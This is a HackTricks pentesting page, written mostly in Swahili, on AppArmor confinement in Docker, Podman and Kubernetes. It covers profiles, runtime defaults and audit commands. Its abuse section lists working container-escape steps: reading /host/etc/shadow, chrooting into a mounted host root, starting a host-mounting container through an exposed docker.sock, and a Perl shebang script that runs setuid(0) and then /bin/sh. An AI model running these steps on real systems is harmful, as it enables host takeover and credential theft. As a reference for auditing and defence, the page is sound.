# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

AppArmor ni mfumo wa **Mandatory Access Control** unaoweka vikwazo kupitia per-program profiles. Tofauti na ukaguzi wa kawaida wa DAC, ambao hutegemea umiliki wa user na group, AppArmor inamruhusu kernel kufuata sera inayofungwa kwenye mchakato mwenyewe. Katika mazingira ya container, hili ni muhimu kwa sababu workload inaweza kuwa na leseni za jadi za kutosha kutekeleza kitendo na bado kukataliwa kwa sababu AppArmor profile yake haitoi ruhusa kwa path, mount, tabia ya network, au matumizi ya capability husika.

Jambo muhimu kimaana ni kwamba AppArmor ni **path-based**. Inafikiria kuhusu upatikanaji wa filesystem kupitia sheria za path badala ya lebo kama SELinux inavyofanya. Hii inaufanya uwe rahisi kuelewa na wenye nguvu, lakini pia ina maana kwamba bind mounts na mipangilio mbadala ya paths zinastahili umakini. Ikiwa maudhui yale yale ya host yanapofikia chini ya path tofauti, athari za sera zinaweza zisifanane na kilichotarajiwa na operator kwa mara ya kwanza.

## Nafasi katika Kutenganisha Container

Ukaguzi wa usalama wa container mara nyingi unasimama kwa capabilities na seccomp, lakini AppArmor bado ina umuhimu baada ya ukaguzi huo. Fikiria container ambayo ina privilage zaidi kuliko inavyostahili, au workload iliyohitaji capability ya ziada kwa sababu za uendeshaji. AppArmor bado inaweza kuzuia upatikanaji wa faili, tabia za mount, mitandao, na mifumo ya utekelezaji kwa njia zinazozuia njia ya wazi ya matumizi mabaya. Ndiyo sababu kuzuia AppArmor "just to get the application working" kunaweza kimya kimya kubadilisha configuration yenye hatari kuwa inayoweza kutumika kwa mashambulizi.

## Maabara

Ili kuangalia kama AppArmor iko hai kwenye host, tumia:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Ili kuona mchakato wa container wa sasa unaendesha chini ya:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Tofauti hii inaelezea vizuri. Katika hali ya kawaida, mchakato unapaswa kuonyesha muktadha wa AppArmor uliounganishwa na profaili iliyochaguliwa na runtime. Katika kesi ya unconfined, tabaka hiyo ya ziada ya vikwazo hupotea.

Unaweza pia kuchunguza kile Docker kinachodhani kimewekwa:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Matumizi ya Runtime

Docker inaweza kutumia profaili ya AppArmor ya chaguo-msingi au ya custom wakati host inaiunga mkono. Podman pia inaweza kuingiliana na AppArmor kwenye mifumo inayotegemea AppArmor, ingawa kwenye distributions zinazoweka SELinux kwanza mfumo mwingine wa MAC mara nyingi hupata nafasi kuu. Kubernetes inaweza kuweka sera za AppArmor kwenye kiwango cha workload kwenye nodes ambazo kwa kweli zinaunga mkono AppArmor. LXC na mazingira ya system-container ya familia ya Ubuntu pia hutumia AppArmor kwa wingi.

Hoja ya kimkakati ni kwamba AppArmor si "sifa ya Docker". Ni sifa ya host-kernel ambayo runtimes kadhaa zinaweza kuchagua kuitumia. Ikiwa host haisaidii au runtime imesema iendeshe unconfined, ulinzi unaotarajiwa haupo kwa kweli.

Kwa Kubernetes hasa, API ya kisasa ni `securityContext.appArmorProfile`. Tangu Kubernetes `v1.30`, annotations za zamani za beta za AppArmor zimekaa zimetupwa. Kwenye hosts zinazounga mkono, `RuntimeDefault` ni profaili ya chaguo-msingi, wakati `Localhost` inarejea profaili ambayo lazima tayari imejazwa kwenye node. Hii ni muhimu wakati wa ukaguzi kwa sababu manifest inaweza kuonekana kuzingatia AppArmor huku ikibaki kutegemea kabisa msaada wa node na profaili zilizojazwa kabla.

Moja ya undani mdogo lakini muhimu operesheni ni kwamba kuweka wazi `appArmorProfile.type: RuntimeDefault` ni kali zaidi kuliko kukosa tu uwanja huo. Ikiwa uwanja umewekwa wazi na node haisaidii AppArmor, admission inapaswa kushindwa. Ikiwa uwanja umeachwa, workload inaweza bado kuendesha kwenye node bila AppArmor na kwa urahisi isipokee tabaka hiyohiyo ya ziada ya kufungia. Kutokana na mtazamo wa mshambuliaji, hii ni sababu nzuri ya kukagua kwa pande zote—manifest na hali halisi ya node.

Kwenye hosts zinazoweza Docker na AppArmor, chaguo-msingi maarufu ni `docker-default`. Profaili hiyo imetengenezwa kutoka Moby's AppArmor template na ni muhimu kwa sababu inaeleza kwa nini baadhi ya PoC zinazotegemea capability bado zinaweza kushindwa kwenye container ya chaguo-msingi. Kwa ujumla, `docker-default` inaruhusu networking ya kawaida, inakataza kuandika sehemu kubwa ya `/proc`, inakataza ufikiaji wa sehemu nyeti za `/sys`, inazuia operesheni za mount, na inapunguza ptrace kiasi kwamba si primitive ya jumla ya kuchunguza host. Kuelewa msingi huo kunasaidia kutofautisha "container ina `CAP_SYS_ADMIN`" na "container kwa kweli inaweza kutumia capability hiyo dhidi ya interfaces za kernel ninazozihitaji".

## Usimamizi wa Profaili

AppArmor profiles kawaida huhifadhiwa chini ya `/etc/apparmor.d/`. Mkutano wa kawaida wa kufunga majina ni kubadilisha slashes katika path ya executable na dots. Kwa mfano, profaili ya `/usr/bin/man` kawaida huhifadhiwa kama `/etc/apparmor.d/usr.bin.man`. Undani huu una umuhimu wakati wa ulinzi na tathmini kwa sababu mara unapo jua jina la profaili inayofanya kazi, mara nyingi unaweza kupata faili inayofanana haraka kwenye host.

Ami za usimamizi muhimu upande wa host ni pamoja na:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Sababu hizi amri zina umuhimu katika marejeo ya usalama wa container ni kwamba zinaelezea jinsi profaili zinavyoundwa, kupakiwa, kubadilishwa kwenda complain mode, na kurekebishwa baada ya mabadiliko ya programu. Ikiwa operator ana tabia ya kuhamisha profaili kwenye complain mode wakati wa kutatua matatizo na kusahau kurejesha enforcement, container inaweza kuonekana imekulindwa katika nyaraka, lakini kwa vitendo inatumia sera nyembamba zaidi.

### Kujenga na Kusasisha Profaili

`aa-genprof` inaweza kuchunguza tabia za programu na kusaidia kuunda profaili kwa muingiliano:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` inaweza kuunda profaili ya kiolezo ambayo inaweza kupakiwa baadaye kwa kutumia `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wakati binary inabadilika na sera inahitaji kusasishwa, `aa-logprof` inaweza kucheza tena kukataa zilizorekodiwa kwenye logi na kumsaidia mwendeshaji kuamua kama kuziruhusu au kuzikataa:
```bash
sudo aa-logprof
```
### Rekodi za logi

Kukanushwa kwa AppArmor mara nyingi kunaonekana kupitia `auditd`, syslog, au zana kama `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Hii ni muhimu kiutendaji na kwa mashambulizi. Walinzi hutumia ili kuboresha profaili. Washambuliaji hutumia ili kujua ni njia gani au operesheni gani hasa inakataliwa na ikiwa AppArmor ndiyo udhibiti unaozuia exploit chain.

### Kutambua Faili Halisi la Profaili

Wakati runtime inaonyesha jina maalum la profaili ya AppArmor kwa container, mara nyingi ni muhimu kuoanisha jina hilo na faili ya profaili iliyopo kwenye diski:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Hii ni hasa muhimu wakati wa host-side review kwa sababu inaziba pengo kati ya "the container says it is running under profile `lowpriv`" and "the actual rules live in this specific file that can be audited or reloaded".

### Sheria Zenye Ishara Muhimu za Kukagua

Ukipata kusoma profile, usiishie kwenye mistari rahisi za `deny`. Aina kadhaa za sheria zinaweza kubadilisha kwa kiasi kikubwa jinsi AppArmor itakavyokuwa na ufanisi dhidi ya jaribio la container escape:

- `ux` / `Ux`: execute the target binary unconfined. If a reachable helper, shell, or interpreter is allowed under `ux`, that is usually the first thing to test.
- `px` / `Px` and `cx` / `Cx`: perform profile transitions on exec. These are not automatically bad, but they are worth auditing because a transition may land in a much broader profile than the current one.
- `change_profile`: allows a task to switch into another loaded profile, immediately or at next exec. If the destination profile is weaker, this can become the intended escape hatch out of a restrictive domain.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: these should change how much trust you place in the profile. `complain` logs denials instead of enforcing them, `unconfined` removes the boundary, and `prompt` depends on a userspace decision path rather than pure kernel-enforced deny.
- `userns` or `userns create,`: newer AppArmor policy can mediate creation of user namespaces. If a container profile explicitly allows it, nested user namespaces remain in play even when the platform uses AppArmor as part of its hardening strategy.

Grep muhimu kwa host-side:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Aina hii ya ukaguzi mara nyingi ni ya manufaa zaidi kuliko kutazama kwa muda kanuni mamia za faili za kawaida. Ikiwa breakout inategemea kuendesha helper, kuingia namespace mpya, au kutoroka kwenda profile isiyozuia sana, jibu mara nyingi limefichwa katika kanuni zinazolenga mabadiliko haya badala ya mistari wazi kama `deny /etc/shadow r`.

## Usanidi usio sahihi

Hitilafu inayoonekana zaidi ni `apparmor=unconfined`. Wasimamizi mara nyingi huweka hili wakati wa ku-debug programu iliyoshindwa kwa sababu profile ilizuia kwa usahihi kitu hatari au kisichotarajiwa. Ikiwa bendera hiyo itaendelea kuwepo katika production, tabaka zima la MAC kwa ufanisi limeondolewa.

Shida nyingine isiyoonekana mara moja ni kudhani kwamba bind mounts hazina hatari kwa sababu ruhusa za faili zinaonekana kawaida. Kwa kuwa AppArmor inategemea njia, kufichua host paths chini ya maeneo mbadala ya mount kunaweza kuingiliana vibaya na kanuni za njia. Hitilafu ya tatu ni kusahau kwamba jina la profile katika faili ya config lina maana ndogo ikiwa kernel ya host haitekelezi AppArmor kwa kweli.

## Matumizi mabaya

Wakati AppArmor haipo, operesheni ambazo zilikuwa zimezuiliwa hapo awali zinaweza ghafla kufanya kazi: kusoma njia nyeti kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zingekuwa ngumu zaidi kutumia, kufanya vitendo vinavyohusiana na mount ikiwa capabilities/seccomp pia zinaviruhusu, au kutumia njia ambazo profile kwa kawaida ingetoa marufuku. AppArmor mara nyingi ndiyo mekanisimu inayofafanua kwa nini jaribio la breakout linalotegemea capabilities "linapaswa kufanya kazi" kwa nadharia lakini bado linashindwa kwa vitendo. Ondoa AppArmor, na jaribio lile lile linaweza kuanza kufanikiwa.

Kama unashuku AppArmor ndiyo kitu kikuu kinachozuia mfululizo wa matumizi mabaya wa path-traversal, bind-mount, au mount-based, hatua ya kwanza kawaida ni kulinganisha kile kinachopatikana kwa ufikiaji ukiwa na profile na bila profile. Kwa mfano, ikiwa host path ime-mounted ndani ya container, anza kwa kukagua ikiwa unaweza kuipitia na kusoma it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya majaribio ya vitendo zaidi ni kuona kama AppArmor ndiyo udhibiti unaozuia mount operations au ufikiaji wa kernel filesystems nyeti:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Katika mazingira ambapo host path tayari inapatikana kupitia bind mount, kupoteza AppArmor pia kunaweza kubadilisha tatizo la read-only la ufichuzi wa taarifa kuwa upatikanaji wa moja kwa moja wa faili za host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Maana ya amri hizi si kwamba AppArmor pekee inasababisha breakout. Badala yake, mara AppArmor inapondolewa, njia nyingi za filesystem na za mount zinazotumiwa vibaya zinaweza kupimwa mara moja.

### Mfano Kamili: AppArmor Disabled + Host Root Mounted

Iwapo container tayari ina host root bind-mounted kwenye `/host`, kuondoa AppArmor kunaweza kubadilisha njia iliyozuiliwa ya kutumia vibaya filesystem kuwa host escape kamili:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Mara shell inapoendeshwa kupitia host filesystem, workload imefanikiwa kutoroka mipaka ya container:
```bash
id
hostname
cat /etc/shadow | head
```
### Mfano Kamili: AppArmor Imezimwa + Runtime Socket

Ikiwa kizuizi halisi kilikuwa AppArmor kinacholinda runtime state, socket iliyopachikwa inaweza kutosha kwa kutoroka kabisa:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
### Mfano Kamili: Path-Based Bind-Mount Bypass

Njia kamili inategemea mount point, lakini matokeo ya mwisho ni yale yale: AppArmor haizuii tena upatikanaji wa runtime API, na runtime API inaweza kuzindua container inayoweza kuharibu host.

Kwa sababu AppArmor ni path-based, kulinda `/proc/**` hakutalinda moja kwa moja yaliyomo ya procfs ya host pale inapopatikana kupitia njia tofauti:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Athari inategemea ni hasa nini kime-mounted na ikiwa njia mbadala pia inapita kando ya udhibiti mwingine, lakini muundo huu ni mojawapo ya sababu zilizo wazi kabisa kwanini AppArmor inapaswa kutathminiwa pamoja na mount layout badala ya kutengwa.

### Full Example: Shebang Bypass

Sera ya AppArmor wakati mwingine inalenga njia ya interpreter kwa njia ambayo haizingatii kikamilifu utekelezaji wa script kupitia shebang handling. Mfano wa kihistoria ulihusisha kutumia script ambayo mstari wake wa kwanza unaonyesha kwenye interpreter iliyofungiwa:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Mfano wa aina hii ni muhimu kama ukumbusho kwamba profile intent na actual execution semantics zinaweza kutofautiana. Wakati ukikagua AppArmor katika container environments, interpreter chains na alternate execution paths zinastahili umakini maalum.

## Ukaguzi

Lengo la ukaguzi huu ni kujibu maswali matatu haraka: je AppArmor imewezeshwa kwenye host, je process ya sasa imefungwa, na je runtime kwa kweli ilitumia profile kwenye container hii?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Kinachovutia hapa:

- Ikiwa `/proc/self/attr/current` inaonyesha `unconfined`, workload haifaidiki na AppArmor confinement.
- Ikiwa `aa-status` inaonyesha AppArmor imezimwa au haijapakiwa, jina lolote la profile kwenye runtime config ni kwa mtindo wa urembo tu.
- Ikiwa `docker inspect` inaonyesha `unconfined` au profile ya custom isiyotarajiwa, mara nyingi ndiyo sababu ya njia ya unyonyaji inayotegemea filesystem au mount kufanya kazi.
- Ikiwa `/sys/kernel/security/apparmor/profiles` haijajumuisha profile uliyotarajia, runtime au konfigurishaji ya orchestrator haitoshi yenyewe.
- Ikiwa profile inayodaiwa kuwa hardened ina `ux`, broad `change_profile`, `userns`, au sheria za aina ya `flags=(complain)`, mpaka wa vitendo unaweza kuwa dhaifu zaidi kuliko jina la profile linavyopendekeza.

Ikiwa container tayari ina elevated privileges kwa sababu za operesheni, kuiacha AppArmor ikiwawezeshwa mara nyingi hufanya tofauti kati ya exception iliyodhibitiwa na kushindwa kubwa kwa usalama.

## Default za Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhaifu wa kawaida kwa mkono |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguo-msingi kwenye hosts zenye uwezo wa AppArmor | Inatumia `docker-default` AppArmor profile isipokuwa ibadilishwe | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Inategemea host | AppArmor inaungwa mkono kupitia `--security-opt`, lakini chaguo-msingi hasa inategemea host/runtime na si ya kawaida kama profile ya `docker-default` ya Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Chaguo-msingi kwa masharti | Ikiwa `appArmorProfile.type` haijaainishwa, chaguo-msingi ni `RuntimeDefault`, lakini inatumika tu wakati AppArmor imewezeshwa kwenye node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` na profile dhaifu, nodes zisizo na msaada wa AppArmor |
| containerd / CRI-O under Kubernetes | Inafuata msaada wa node/runtime | Runtimes za kawaida zinazotumiwa na Kubernetes zinaunga mkono AppArmor, lakini utekelezaji wa kweli bado unategemea msaada wa node na mipangilio ya workload | Kama kwenye safu ya Kubernetes; usanidi wa moja kwa moja wa runtime pia unaweza kuruka AppArmor kabisa |

Kwa AppArmor, tofauti muhimu mara nyingi ni **host**, sio tu runtime. Uteuzi wa profile kwenye manifest hauanzishi confinement kwenye node ambapo AppArmor haijawezeshwa.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
